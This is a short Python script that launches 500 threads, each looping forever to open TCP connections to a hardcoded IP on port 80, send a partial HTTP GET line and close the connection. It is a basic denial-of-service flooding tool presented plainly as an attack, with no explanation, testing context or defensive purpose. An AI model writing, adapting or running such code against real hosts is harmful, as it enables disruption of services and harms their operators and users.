import socket
import threading

target_ip = "192.168.1.1"
target_port = 80

def attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target_ip, target_port))
        s.sendto(("GET /" + target_ip + " HTTP/1.1\r\n").encode('ascii'), (target_ip, target_port))
        s.close()

for i in range(500):
    thread = threading.Thread(target=attack)
    thread.start()
